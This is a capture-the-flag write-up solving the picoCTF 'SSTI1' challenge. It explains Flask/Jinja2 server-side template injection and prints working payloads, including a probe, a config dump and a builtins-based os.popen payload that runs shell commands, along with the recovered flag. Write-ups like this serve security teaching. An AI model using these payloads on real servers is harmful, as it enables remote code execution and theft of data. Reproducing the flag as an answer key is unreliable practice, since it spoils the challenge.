### SSTI1

**Description:**  
We are presented with a web challenge that contains a Server-Side Template Injection (SSTI) vulnerability.  
In SSTI, the server renders templates using engines like **Jinja2**. If the developer directly injects user input into templates without validation, it may lead to code execution.

For example:
```html
<p>Hello, {{ nome }}!</p>
```
If the server substitutes `{{ nome }}` with user-provided content directly, like `{{7*7}}`, and renders it as code, it may execute the expression, which indicates a vulnerability.

**Approach:**

1. **Test whether the input is being executed as code:**
   ```jinja2
   {{7*7}}
   ```
   - This expression checks if the server is evaluating input.
   - If the result is `49`, then the template engine is executing injected code (SSTI is active).
   - If it returns `{{7*7}}`, the input is treated as plain text, not vulnerable.

   Output:
   ```
   49
   ```
   The server responded with `49`, confirming SSTI is possible.

2. **Check for internal Flask configuration:**
   ```jinja2
   {{ config.items() }}
   ```
   - `config` is a Flask object that holds internal configuration.
   - Dumping `config.items()` shows settings like `DEBUG`, `SECRET_KEY`, etc.
   - This confirms that the app uses Flask + Jinja2, and provides info about the environment.

   Output:
   ```
   ('DEBUG', False), ('SECRET_KEY', None), ...
   ```
   This step confirms the backend uses Flask with Jinja2, so we know Python-based payloads will work. It prepares us to safely execute system commands next, which is essential to locate the flag.

3. **Attempt command execution through Python built-ins:**
   ```jinja2
   {{ config.__class__.__init__.__globals__['__builtins__']['__import__']('os').popen('ls /').read() }}
   ```
   This command performs a **Remote Code Execution (RCE)** by leveraging Python introspection:

   - `config` is a Flask object available in the template context.
   - `config.__class__.__init__.__globals__` accesses the global namespace of the `__init__` methodâ€™s module.
   - `['__builtins__']['__import__']('os')` dynamically imports the Python `os` module.
   - `os.popen('ls /')` executes the shell command `ls /` to list the root directory.
   - `.read()` reads and returns the output of the command.

   This payload is commonly used in Jinja2 SSTI to escalate from template injection to full command execution on the server.

   Output:
   ```
   bin  boot  challenge  dev  etc  home  lib ...
   ```

4. **Search for the flag:**
   ```jinja2
   {{ config.__class__.__init__.__globals__['__builtins__']['__import__']('os').popen('grep picoCTF /challenge/*').read() }}
   ```
   - This command searches recursively for the string `picoCTF` inside `/challenge/*`.
   - Since CTF flags follow the `picoCTF{}` format, this can help locate the flag.

   Output:
   ```
   /challenge/flag:picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_73c99823}
   ```

5. **Flag found:**
   ```
   picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_73c99823}
   ```

